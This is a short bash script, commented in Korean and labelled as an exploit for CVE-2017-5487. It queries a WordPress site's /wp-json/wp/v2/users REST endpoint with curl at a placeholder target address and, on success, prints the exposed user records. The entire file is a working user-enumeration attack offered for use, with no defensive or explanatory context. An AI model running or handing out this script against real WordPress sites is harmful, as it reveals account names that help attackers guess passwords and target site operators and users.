#!/bin/bash

# CVE-2017-5487 Exploit
# This script exploits the CVE-2017-5487 vulnerability.
# Copyright (c) 2024 Anzinius
# MIT License

# 대상 IP, 포트, 프로토콜 설정
TARGET_IP="192.168.1.100"
TARGET_PORT=8080
TARGET_PROTOCOL="http"
# TARGET_PROTOCOL="https"

# 대상 URL 생성
target_url="${TARGET_PROTOCOL}://${TARGET_IP}:${TARGET_PORT}"

# 공격 경로 설정
attack_path="/wp-json/wp/v2/users"
url="${target_url}${attack_path}"

# GET 요청 보내기
echo "[+] Sending exploit to ${url}"
response=$(curl -s -o /dev/null -w "%{http_code}" "$url")

# 응답 코드에 따른 결과 출력
if [ "$response" -eq 200 ]; then
    echo "[+] Exploit successful!"
    curl -s "$url" | jq
else
    echo "[-] Exploit failed with status code: $response"
fi

